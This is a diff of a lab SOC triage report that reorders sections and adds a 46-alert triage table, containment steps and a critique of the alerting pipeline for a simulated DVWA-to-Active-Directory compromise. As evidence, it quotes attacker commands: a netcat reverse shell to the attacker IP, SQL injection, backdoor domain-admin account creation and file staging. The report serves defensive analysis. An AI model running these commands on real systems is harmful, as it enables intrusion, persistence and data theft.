@@ -9,10 +9,10 @@
 ## 📑 Table of Contents
 
 1. [Opening the Queue: Priority Triage First, Then Tracing the Full Story](#1-opening-the-queue-priority-triage-first-then-tracing-the-full-story)
-2. [Chronological Walkthrough of All 46 Alerts by Time Window](#2-chronological-walkthrough-of-all-46-alerts-by-time-window)
-3. [Master Triage Table: All 46 Alerts](#3-master-triage-table-all-46-alerts)
-4. [Immediate Containment Actions & Why I Am Taking Each One Right Now](#4-immediate-containment-actions--why-i-am-taking-each-one-right-now)
-5. [Analyst Critique of Our Alert Creation Pipeline: 8 Flaws to Fix](#5-analyst-critique-of-our-alert-creation-pipeline-8-flaws-to-fix)
+2. [Master Triage Table: All 46 Alerts](#2-master-triage-table-all-46-alerts)
+3. [Immediate Containment Actions & Operational Rationale](#3-immediate-containment-actions--operational-rationale)
+4. [Analyst Critique of Our Alert Creation Pipeline: 8 Flaws to Fix](#4-analyst-critique-of-our-alert-creation-pipeline-8-flaws-to-fix)
+5. [Deep-Dive Chronological Evidence Walkthrough by Time Window](#5-deep-dive-chronological-evidence-walkthrough-by-time-window)
 
 ---
 
@@ -51,14 +51,19 @@ Right away, two things jump out at me:
 
 When I glance at the surrounding Medium alerts, the picture gets even worse: I see `Logon activity: ROOT @ 192.168.232.135` on DVWA, `Logon activity: BACKDOOR @ local` on DomainWin10, repeated `[FANOUT x...]` parent PID 4432 and parent PID 4008 process trees on DomainWin10 and Win10User, and **simulated ransomware/reboot commands across both Windows machines!**
 
-## Step 3: Why I Switch to a Chronological Walkthrough (17:10 IST → 18:36 IST)
+## Step 3: Fast-Triage Strategy: Overview First, Deep Forensics Below
 
-This initial priority check proves two things:
+This initial priority check proves two critical operational realities:
 
 1. Our environment is **heavily compromised** across DVWA, DomainWin10, and Win10User.
 2. **TheHive's default severity ranking cannot be trusted blindly**—it ranked a harmless Nikto probe as Critical while burying active reverse shells, Domain Controller wmiexec.py takeovers, and destructive impact batches under Medium.
 
-Before I dive into deep forensics, I need to walk through all 46 alerts chronologically across **6 time windows** (`17:10 IST` to `18:36 IST`), distinguish clearly between what is **confirmed by raw log evidence** versus what is **suspected / pending host-log verification**, assign my own **Real Priority (P1 – P4)**, and execute immediate containment to lock the attacker out.
+Because an active compromise demands immediate containment before an analyst spends hours writing granular forensic reports, this document is structured in an **executive-to-deep-dive order**:
+
+- **Section 2:** The complete **Master Triage Table** classifying all 46 alerts with real analyst priorities (P1–P4) and verified verdicts.
+- **Section 3:** The **Immediate Containment Actions** executed right now to sever attacker access before evidence tampering occurs.
+- **Section 4:** An **Analyst Critique of our Alert Creation Pipeline** highlighting the 8 engineering flaws in Wazuh, Suricata, and TheHive that produced this triage confusion.
+- **Section 5:** The exhaustive, evidence-backed **Deep-Dive Chronological Evidence Walkthrough** across all 6 time windows (`17:10 IST` to `18:36 IST`) with raw alert logs and screenshots for full forensic attribution.
 
 ![TheHive Alerts queue sorted by Severity](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_01_thehive_severity_queue.png)
 *Figure 1: TheHive alerts queue sorted by Severity, exposing 1 Critical Shellshock alert and 4 High alerts (#03, #17, #31, #33).*
@@ -71,7 +76,226 @@ Before I dive into deep forensics, I need to walk through all 46 alerts chronolo
 
 ---
 
-# 2. Chronological Walkthrough of All 46 Alerts by Time Window
+# 2. Master Triage Table: All 46 Alerts
+
+> **With Verbatim Titles, Priorities & Verdicts**
+
+| # | IST Time | Verbatim TheHive Alert Title | Host / Sensor | TheHive Sev | Real Priority | Verdict | Key Evidence & Next Verification Step |
+|---|----------|------------------------------|-------------|-------------|---------------|---------|----------------------------------------|
+| #01 | 17:10:09 | [2x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Nmap SYN probe (`src_port: 34938`) to closed port 4444 (`pkts_toclient: 0`). |
+| #02 | 17:10:09 | [TOOL:unknown-scanner x17] [Suricata] 192.168.232.135 | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | **Unbounded 69m bundle** (`17:10:09 – 18:19:03 IST`) across ports 22, 80, 1433, 1521, 3306, 3389, 5432, 5815. |
+| #03 | 17:10:09 | [TOOL:Nmap x3] [Suricata] 192.168.232.135 | Suricata | High | Low (P4) | **Confirmed TP (Recon)** | Signatures POSSBL PORT SCAN (NMAP -sS) & ET SCAN NMAP OS Detection Probe (`86601`). |
+| #04 | 17:12:05 | [2x] [DVWA] DVWA: Multiple 400 errors - [404] [192.168.232.135] [/udOIY0cZ.fhp] | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | Two 404 hits on nonsense `/udOIY0cZ.fhp` path (Nikto fuzzer check, rule `31151`). |
+| #05 | 17:12:08 | [1x] [Suricata] Suricata: High-volume HTTP 4xx burst from 192.168.232.135... | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | Rule `100410` flagging >100 in 60s HTTP 4xx Nikto enumeration burst. |
+| #06 | 17:12:08 | [5x] [DVWA] Shellshock attack detected | DVWA | Critical | Low (P4) | **Confirmed FP (Exploit)** | Nikto `93e4r0-CVE-2014-6271: true` canary header on PHP pages; no execution. |
+| #07 | 17:12:09 | [16x] [DVWA] Multiple common web attacks from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 16 Nikto probes (rule `31153`), including buried `rfiinc.txt%00` RFI test (404). |
+| #08 | 17:12:09 | [WATCHLIST x14: passwd] [DVWA] 192.168.232.135 | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 14 Nikto path-traversal probes matching passwd watchlist (rule `31153`, all failed). |
+| #09 | 17:12:10 | [26x] [DVWA] Multiple XSS (Cross Site Scripting) attempts from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 26 Nikto XSS probes (rule `31154`), all unauthenticated/failed. |
+| #10 | 17:12:16 | [4x] [Suricata] Suricata: Alert - GPL EXPLOIT unicode directory traversal attempt | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | 4 Nikto `%2e%2e/` traversal probes (rule `86601`). |
+| #11 | 17:18:02 | [22x] [Suricata] Suricata: [200] [192.168.232.135] [/login.php] [ET INFO User-Agent...] | Suricata | Medium | Critical (P1) | **Suspected Brute-Force / Confirmed SQLi & Upload** | 14 GET /login.php -> 2 GET /index.php (pull host auth log to confirm POST); 1 UNION SELECT SQLi (Alert 17); shell.php upload & ?cmd=id (Alert 18–22). |
+| #12 | 17:21:53 | [FANOUT x1] [DVWA] parent PID 17550 | DVWA | Medium | High (P2) | **Confirmed TP (RCE)** | Host auditd logs `uid=33` (www-data) executing `/usr/bin/id`. |
+| #13 | 17:21:58 | [1x] [Suricata] Suricata: Alert - ET ATTACK_RESPONSE Output of id command... | Suricata | Medium | High (P2) | **Confirmed TP (RCE)** | HTTP response returning `uid=33(www-data)` to 192.168.232.135. |
+| #14 | 17:24:03 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Critical (P1) | **Confirmed TP (Shell)** | Live reverse shell flow `192.168.56.30:47946 -> 192.168.232.135:4444`. |
+| #15 | 17:24:03 | [FANOUT x1] [DVWA] parent PID 17562 | DVWA | Medium | Critical (P1) | **Confirmed TP (Shell)** | Host auditd logs `/usr/bin/nc.openbsd` (`mkfifo /tmp/f...nc 192.168.232.135 4444`). |
+| #16 | 17:29:43 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | Critical (P1) | **Confirmed TP (Root SSH)** | `Accepted publickey for root from 192.168.232.135 port 36488 ssh2: ED25519 SHA256:sMGVpOuq...` |
+| #17 | 17:30:49 | [TOOL:Nmap x9] [Suricata] 192.168.56.30 | Suricata | High | High (P2) | **Confirmed TP (Pivot Scan)** | Signatures POSSBL PORT SCAN (NMAP -sS) & (NMAP -sX) across ports 1, 111, 199, 31768, 443, 995. |
+| #18 | 17:30:51 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Triggered when DVWA's internal Nmap scan probed port 4444. |
+| #19 | 17:32:16 | [TOOL:unknown-scanner x14] [Suricata] 192.168.56.30 | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Scan)** | 14 hits of ET SCAN Potential SSH Scan OUTBOUND on port 22 from 192.168.56.30. |
+| #20 | 17:34:27 | [4x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 4 succeeded root SSH publickey events from 192.168.232.135. |
+| #21 | 17:39:46 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events from 192.168.232.135. |
+| #22 | 18:01:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events 16s before GoldenPac alert #23. |
+| #23 | 18:01:18 | [1x] [Suricata] Suricata: Alert - ET EXPLOIT Possible GoldenPac Priv Esc in-use | Suricata | Medium | Critical (P1) | **Suspected / High-Confidence TP** | Flow `192.168.56.30:33986 -> 192.168.56.10:88` (krb5); pattern-consistent with MS14-068 (pull PCAP to verify PAC). |
+| #24 | 18:03:52 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events on DVWA. |
+| #25 | 18:04:47 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | Rule `100613`: Impacket wmiexec detected (AD\Administrator, `cd \` & `cd`). |
+| #26 | 18:05:43 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
+| #27 | 18:06:53 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) session init (`cd \` & `cd`) on PC-DC.ad.lab. |
+| #28 | 18:07:26 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
+| #29 | 18:08:21 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Backdoor)** | Runs `net user backdoor P@ssw0rd123! /add`, `net localgroup Administrators backdoor /add`, and failed curly-quote `net group "Domain Admins"`. |
+| #30 | 18:08:22 | [3x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (User Added)** | Rule `60109` (Event IDs 4720/4722/4738) confirming AD\backdoor creation. |
+| #31 | 18:08:27 | [1x] [DomainWin10] Logon activity: ADMINISTRATORS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Admin Group)** | Rule `60154` (Event ID 4732) confirming CN=backdoor added to Administrators. |
+| #32 | 18:09:05 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DomAdmin Cmd)** | Runs ASCII-quote `net group "Domain Admins" backdoor /add`, `net user backdoor /passwordchg:no`, and `net user backdoor`. |
+| #33 | 18:09:05 | [1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Domain Admin)** | Rule `60159` (Event ID 4728) confirming CN=backdoor added to Domain Admins. |
+| #34 | 18:09:28 | [2x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | High (P2) | **Confirmed TP (Policy Lock)** | Rule `60110` (Event ID 4738) confirming `/passwordchg:no` applied to backdoor. |
+| #35 | 18:13:58 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | High (P2) | **Confirmed TP (AD Staging)** | Dumps `net user /domain > C:\Windows\Temp\domain_users.txt` & `whoami /all > admin_info.txt`. |
+| #36 | 18:14:58 | [FANOUT x3] [Win10User] parent PID 4008 | Win10User | Medium | High (P2) | **Confirmed TP (Lateral)** | wmiexec.py (PID 4008) on Win10.ad.lab runs `type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_data.txt`. |
+| #37 | 18:17:30 | [6x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 6 rapid root SSH logins on DVWA (session re-establishment; no scp/sftp indicator in log). |
+| #38 | 18:19:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 2 root SSH logins on DVWA 47s before launching Window 6 impact commands. |
+| #39 | 18:19:49 | [FANOUT x9] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Impact)** | Consolidated 9-step batch: copies hacked.bmp to `C:\Users\Public\`, runs 2 reg add wallpaper commands, writes README_HACKED.txt & .enc files to `C:\Users\Administrator\Desktop\`, runs `shutdown /r /t 0`. |
+| #40 | 18:20:05 | [FANOUT x1] [DomainWin10] parent PID 6500 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #39). |
+| #41 | 18:20:11 | [FANOUT x1] [DomainWin10] parent PID 4980 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #39). |
+| #42 | 18:23:59 | [FANOUT x9] [Win10User] parent PID 4008 | Win10User | Medium | Critical (P1) | **Confirmed TP (Win10 Impact)** | Consolidated 9-step batch on Win10User: copies hacked.bmp, runs 2 reg add commands, writes README_HACKED.txt & .enc files to `C:\Users\win10\Desktop\`, runs `shutdown /r /t 0`. |
+| #43 | 18:23:59 | [3x] [Suricata] Suricata: Alert - ET INFO NTLM Session Setup Request - Negotiate | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Context)** | NTLM Negotiate/Challenge/Auth (`192.168.56.30:32922 <-> 192.168.56.20:445`); supporting context for DVWA -> Win10 pivot. |
+| #44 | 18:24:12 | [FANOUT x1] [Win10User] parent PID 1724 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #42). |
+| #45 | 18:24:18 | [FANOUT x1] [Win10User] parent PID 3880 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #42). |
+| #46 | 18:36:34 | [1x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Live Backdoor)** | Post-reboot Event ID 4738 check (rule `60110`) confirming AD\backdoor survived reboot. |
+
+---
+
+# 3. Immediate Containment Actions & Operational Rationale
+
+Before I start a deep forensic investigation to write up Cases 01, 02, and 03, I have to **lock the attacker out**. If I leave their Critical (P1) footholds open while I spend hours analyzing logs, they can log right back in, wipe evidence, or deploy real ransomware. Even more importantly, **the sequence of containment matters**: if I delete their webshell or AD\backdoor account before cutting off their network access, the attacker can see my cleanup in real time and plant a second hidden backdoor.
+
+## 🛡️ Action 1: Block Attacker IP 192.168.232.135 at the Firewall & Cut DVWA's Internal Pivot Bridge (192.168.56.30)
+
+### Why I am doing this first (The Reasoning):
+
+Every external attack in the queue—from the python-requests session (#11) and the port 4444 reverse shell (#14 – #15) to all root SSH logins (#16, #20 – #22, #24, #37, #38)—originated from `192.168.232.135`. Alerts #17 (Internal Nmap), #19 (Outbound SSH Scan), #23 (Kerberos traffic `.56.30 -> .56.10:88`), and #43 (NTLM Session Setup `.56.30 <-> .56.20:445`) show that **DVWA (`192.168.56.30`) is acting as the internal jump box into Active Directory**.
+
+### What I am executing immediately:
+
+- **Block all inbound and outbound traffic to/from `192.168.232.135`** at the perimeter firewall (especially TCP `:22` SSH, `:80` HTTP, and `:4444`).
+- **Isolate DVWA (`192.168.56.30`)** by blocking outbound connections from `.56.30` to `192.168.56.10` (PC-DC) and `192.168.56.20` (Win10) on ports `:88` (Kerberos), `:445` (SMB), and `:135` (RPC/WMI). This blinds the attacker immediately before I touch a single file on the hosts.
+
+## 🛡️ Action 2: Remove the Rogue Root SSH Key, Kill Live Shells & Quarantine shell.php on DVWA (192.168.56.30)
+
+### Why I am doing this (The Reasoning):
+
+On DVWA, the attacker established **three independent ways in**. If I only delete shell.php, they can still log straight in as root via SSH (#16) or use their open Netcat shell (#15). Conversely, if I only remove the SSH key, they can re-run commands through shell.php (#11). **I must close all three simultaneously while preserving copies for forensic analysis.**
+
+### What I am executing on DVWA:
+
+- **Remove Root SSH Persistence (#16):** Copy `/root/.ssh/authorized_keys` to `/root/forensics_authorized_keys.bak` (preserving metadata/timestamps for Case 01), then delete the line containing `ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE`.
+- **Kill Active Attacker Processes (#14 – #15):** Terminate any active `sshd: root@...` sessions from `192.168.232.135` (such as port 36488), kill any `/usr/bin/nc.openbsd` (`nc 192.168.232.135 4444`) or `/bin/sh -i` processes, and remove the named pipe `rm -f /tmp/f`.
+- **Quarantine the Webshell (#11):** Move `/var/www/html/hackable/uploads/shell.php` out of the web root to `/root/forensics_shell.php.quarantine` (`chmod 000`) so Apache (www-data) can no longer execute `?cmd=` requests.
+
+## 🛡️ Action 3: Disable AD\backdoor, Strip Its Admin Groups & Twice-Reset krbtgt on DomainWin10 (192.168.56.10)
+
+### Why I am doing this (The Reasoning):
+
+**Why I disable AD\backdoor instead of deleting it (#29 – #34, #46):** If I run `net user backdoor /del` right now, Active Directory deletes the user object and its SID (`S-1-5-21-...-4192`) before I finish correlating Velociraptor and Security Event logs. By disabling AD\backdoor and removing it from Domain Admins and Administrators, I revoke its access 100% while preserving every forensic artifact.
+
+**Why resetting AD\Administrator alone is NOT enough (#23 GoldenPac & #25 wmiexec.py):** Because Alert #23 indicates high-confidence GoldenPac (MS14-068) Kerberos ticket forgery and #25 confirms wmiexec.py running as AD\Administrator, **any forged Kerberos Ticket-Granting Ticket (TGT) signed by krbtgt remains valid for up to 10 hours even if AD\Administrator's password is changed!** To invalidate all forged Kerberos tickets across the domain, I must reset the krbtgt password **twice** (since Active Directory keeps a 2-password history for krbtgt) and purge Kerberos ticket caches (`klist purge`).
+
+### What I am executing on PC-DC.ad.lab:
+
+```cmd
+net user backdoor /active:no /domain
+net group "Domain Admins" backdoor /del /domain
+net localgroup Administrators backdoor /del
+```
+
+*(Followed immediately by rotating AD\Administrator's password, resetting krbtgt twice, and running `klist purge`.)*
+
+## 🛡️ Action 4: Terminate WMI/SMB Sessions on Win10User (192.168.56.20) & Quarantine Staged Files on Both Windows Hosts
+
+### Why I am doing this (The Reasoning):
+
+In Alerts #35 and #36, the attacker dumped sensitive AD and workstation data into `C:\Windows\Temp\domain_users.txt`, `admin_info.txt`, and `sensitive_data.txt`. And in #39 and #42, they copied hacked.bmp to `C:\Users\Public\hacked.bmp`, modified `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle), and wrote README_HACKED.txt, documents.enc, and passwords.enc onto `C:\Users\Administrator\Desktop\` (on the DC) and `C:\Users\win10\Desktop\` (on Win10User).
+
+### What I am executing:
+
+- Kill any lingering `WmiPrvSE.exe` child `cmd.exe` processes (parent PID 4432 on DC, parent PID 4008 on Win10)
+- Close active SMB sessions (`net session /delete`)
+- Move the staged `.txt`, `C:\Users\Public\hacked.bmp`, `README_HACKED.txt`, and `.enc` files into a secure forensic evidence folder
+- Restore `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle)
+
+## 🛡️ Action 5: Rotate DVWA Web Application & Database Passwords (#11)
+
+### Why I am doing this (The Reasoning):
+
+Because the attacker dumped the MySQL `users` table via `UNION SELECT user, password FROM users-- -` (Alert 17 in #11) after the suspected `/login.php` brute-force (Alert 1 – 16), I must rotate all DVWA application passwords and MariaDB/MySQL database credentials before bringing the web application back online.
+
+---
+
+# 4. Analyst Critique of Our Alert Creation Pipeline: 8 Flaws to Fix
+
+Reviewing these 46 alerts as an analyst exposed **eight major engineering flaws** in how our lab (`custom-thehive.py`, Wazuh `local_rules.xml`, and Suricata) currently generates, titles, tags, and prioritizes alerts in TheHive:
+
+## ⚠️ Flaw 1: Upside-Down Severity Mapping (Scanner Noise Marked Critical, Active Breaches Marked Medium)
+
+### What went wrong:
+
+Our pipeline maps Wazuh `rule.level` directly to TheHive severity using static thresholds (`level >= 12` → Critical, `9–11` → High, `5–8` → Medium). Because default rules assign level 5–8 to Impacket wmiexec detected (`100613`), Linux auditd (`80792`), SSH logins (`5715`), and Suricata exploit/response rules (`86601`), **the worst attacks in the entire incident were buried as Medium**:
+
+- **False Critical / High:** Failed Nikto Shellshock header (#06 = Critical) and external Nmap scan (#03 = High).
+- **False Medium (Should be Critical):** Web SQLi + shell.php upload (#11), Netcat reverse shell (#14 – #15), root SSH login from attacker IP (#16), GoldenPac DC exploit (#23), wmiexec.py on DC (#25 – #29, #32), BACKDOOR user creation (#30), and simulated ransomware + forced reboots (#39 – #45).
+
+### How to fix it:
+
+Promote Wazuh rule `100613` (Impacket wmiexec detected), `mkfifo / nc.openbsd` reverse shells, ET EXPLOIT GoldenPac, Event ID 4720 (`60109` add_user on DC), and `shutdown /r` / `.enc` file drops to **Critical (Sev 4)**, and downgrade unauthenticated scanner 404 / 400 bursts to **Low (Sev 1)**.
+
+## ⚠️ Flaw 2: Missing [TOOL:...] Detection Tags (Only Nmap Was Named; Everything Else Was Missed or Tagged unknown-scanner)
+
+### What went wrong:
+
+While #03 and #17 were tagged `[TOOL:Nmap]`, #02 and #19 were tagged `[TOOL:unknown-scanner]`, and the pipeline failed to tag `[TOOL:...]` on the other attack tools even when Wazuh/Suricata already knew the tool name:
+
+- **Missed [TOOL:Nikto] (#04 – #10):** Raw HTTP logs explicitly contained `Mozilla/5.00 (Nikto/2.1.6)`.
+- **Missed [TOOL:Impacket-wmiexec] (#25 – #29, #32, #35, #36, #39, #42):** Inside the description, Wazuh rule `100613` literally says **Impacket wmiexec detected**, yet `custom-thehive.py` overwrote the alert title with `[FANOUT x...] parent PID 4432` and dropped the Impacket wmiexec label from the title!
+- **Missed [TOOL:Impacket-GoldenPac] (#23) & [TOOL:Netcat] (#15).**
+
+### How to fix it:
+
+Update `custom-thehive.py` so `[FANOUT]` title formatting preserves high-value rule names like Impacket wmiexec detected (`[TOOL:Impacket-wmiexec]`) and matches `Nikto/2.1.6` in `http_user_agent`.
+
+## ⚠️ Flaw 3: Misleading & Opaque Alert Titles ([FANOUT] parent PID & Group-Name Inversion)
+
+### What went wrong:
+
+- **[FANOUT x...] parent PID 4432 Hides Impacket wmiexec and the Executed Commands (#12, #15, #25 – #29, #32, #35, #36, #39 – #42, #44 – #45):** Seventeen alerts in the queue have titles like `[FANOUT x2] [DomainWin10] parent PID 4432` or `[FANOUT x1] [DVWA] parent PID 17562`. That tells an analyst nothing at first glance, even though the underlying events contain the exact binary (`/usr/bin/nc.openbsd`, `/usr/bin/id`, `reg.exe`) and the exact `commandLine`!
+- **Windows Group Changes Show the Group Name Instead of the Added User (#31, #33):** `[1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local` pulls `targetUserName` (DOMAIN ADMINS) instead of `memberName` (CN=backdoor).
+
+### How to fix it:
+
+Include `distinct_images` and the first/highest-severity `commandLine` in `[FANOUT]` titles, and format 4728 / 4732 titles as `Group Change: Added <memberName> to <targetUserName>`.
+
+## ⚠️ Flaw 4: Over-Broad Alert Grouping (#11 Buried 4 Kill-Chain Stages Under a GET /login.php Title)
+
+### What went wrong:
+
+In Alert #11, `custom-thehive.py` bundled 22 events across almost 4 minutes (`17:18:02` to `17:21:54 IST`) because they all fired Wazuh wrapper rule `100600`, and named the entire bundle after the very first event (`[200] [192.168.232.135] [/login.php] [ET INFO User-Agent (python-requests)]`). That buried **ET WEB_SERVER SELECT USER SQL Injection Attempt in URI** (Alert 17), **ET WEB_SERVER PHP System Command in HTTP POST** (Alert 20 – 21), and **ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)** (Alert 22) inside an informational User-Agent alert!
+
+### How to fix it:
+
+Group Suricata web alerts by `(src_ip, alert.signature_id)` rather than wrapper rule `100600`, and always title/score a bundle using its **highest-severity signature**.
+
+## ⚠️ Flaw 5: Broken Auto-Tagging (T1047 WMI on Linux SSH & stages:N Event Counters)
+
+### What went wrong:
+
+Whenever `process_fanout` or multi-event grouping triggered, `custom-thehive.py` attached MITRE **T1047** (Windows Management Instrumentation) even to Ubuntu Linux sshd / auditd events and Windows Event ID 4738 account modifications, and used `stages:N` (`stages:22`, `stages:16`) to represent the sub-event hit count rather than kill-chain stage numbers.
+
+### How to fix it:
+
+Restrict T1047 strictly to Windows events where `parentImage` / `parentProcessName` is `WmiPrvSE.exe`, and rename `stages:N` to `events:N` or `hits:N`.
+
+## ⚠️ Flaw 6: Host & Network Visibility Blind Spots (Linux Privesc & Initial DC SMB Pivot)
+
+### What went wrong:
+
+- **Zero alerts fired during the 5m 40s Linux privilege escalation gap** (`17:24:03 – 17:29:43 IST`) where www-data escalated to root and wrote `/root/.ssh/authorized_keys`
+- **Zero Suricata alerts fired when DVWA first connected to PC-DC:445** to launch wmiexec.py at `18:04:47 IST`
+
+### How to fix it:
+
+Add auditd `euid=0` privesc rules + Wazuh `realtime="yes"` FIM on `/root/.ssh/authorized_keys`, and ensure Suricata monitors `.56.30 <-> .56.10:445`.
+
+## ⚠️ Flaw 7: No Visibility into POST-Based Login Activity on /login.php (Alert #11)
+
+### What went wrong:
+
+Every event tied to the credential-access attempt in Alert #11 logs as **GET** under Suricata rule `100600`, which matches on User-Agent (python-requests) rather than HTTP method or request body. If the actual brute-force traffic went over POST—the far more likely mechanism for submitting credentials—this pipeline has no rule capturing it, and the alert queue alone cannot confirm what credential pair was submitted or whether authentication succeeded.
+
+### How to fix it:
+
+Add a dedicated detection rule keyed on **POST /login.php** with response-size, `302` redirect `Location`, or session-cookie heuristics, and ingest DVWA's own host-side Apache access/application auth logs into Wazuh so credential-access attempts aren't solely dependent on Suricata's network-layer User-Agent view.
+
+## ⚠️ Flaw 8: Unbounded Alert Correlation Time Window (Alert #02 Absorbed Sub-Events for 69 Minutes)
+
+### What went wrong:
+
+Alert #02's Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes across the entire incident**—long after the webshell upload (#11), the Netcat reverse shell (#14 – #15), and the root SSH access (#16, #20 – #22, #24, #37, #38) had already occurred. Post-compromise traffic from the same source IP keeps being filed under a Window 1 recon alert, so an analyst working the queue by time window never sees that the same source remained active throughout the entire attack chain.
+
+### How to fix it:
+
+Bound the correlation window in `custom-thehive.py`: close a grouped alert after a fixed timeout (e.g., 5–10 minutes without new sub-events) and split the bundle whenever the gap between sub-events exceeds a threshold, so post-compromise activity from the same source lands in a fresh, correctly-prioritized alert instead of silently extending a stale scanner bundle.
+
+---
+
+# 5. Deep-Dive Chronological Evidence Walkthrough by Time Window
+
+> **Forensic Deep Dive with Full Raw Logs, Verifications & Evidence Screenshots**
+> For analysts seeking granular event-by-event validation, this section steps through each of the 6 time windows chronologically, detailing the exact commands executed, underlying Wazuh and Suricata telemetry, and forensic proof.
 
 ## 🪟 Window 1 (17:10:09 – 17:12:16 IST) — Alerts #01 to #10: External Nmap & Nikto Reconnaissance
 
@@ -90,7 +314,7 @@ Pulling the raw Suricata JSON inside Alert #03 shows that the actual signatures 
 ![Alert #03 Detail: Nmap OS & Port Scan Probe](Screenshot/Initial%20triage%20and%20investigation%20-%20screenshot/slot_02_alert03_nmap_os_detection_probe.png)
 *Figure 2: Alert #03 detail view in TheHive showing Suricata signatures POSSBL PORT SCAN (NMAP -sS) and ET SCAN NMAP OS Detection Probe.*
 
-> **📌 Important Note on Alert #02** ([TOOL:unknown-scanner x17] [Suricata] 192.168.232.135): Although Alert #02 sits in Window 1 because its first event fired at `17:10:09 IST`, its Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes** across the entire incident (long after the webshell, reverse shell, and root SSH access had already occurred—documented as **Flaw 8** in Section 5).
+> **📌 Important Note on Alert #02** ([TOOL:unknown-scanner x17] [Suricata] 192.168.232.135): Although Alert #02 sits in Window 1 because its first event fired at `17:10:09 IST`, its Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes** across the entire incident (long after the webshell, reverse shell, and root SSH access had already occurred—documented as **Flaw 8** in Section 4).
 
 ### Phase 1B: Automated Nikto Web Vulnerability Scan (17:12:05 – 17:12:16 IST)
 
@@ -477,222 +701,6 @@ cmd /c "type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_da
 |-------|---------|-------------|------------------|
 | **#39, #40, #41, #42, #44, #45, #46** | Confirmed True Positives (Simulated Ransomware/Defacement Impact, Forced Reboots & Surviving Backdoor) | Medium | **Critical (P1)** |
 | **#43** | Confirmed True Positive (Supporting NTLM Pivot Context) | Medium | **High (P2)** |
-
----
-
-# 3. Master Triage Table: All 46 Alerts
-
-> **With Verbatim Titles, Priorities & Verdicts**
-
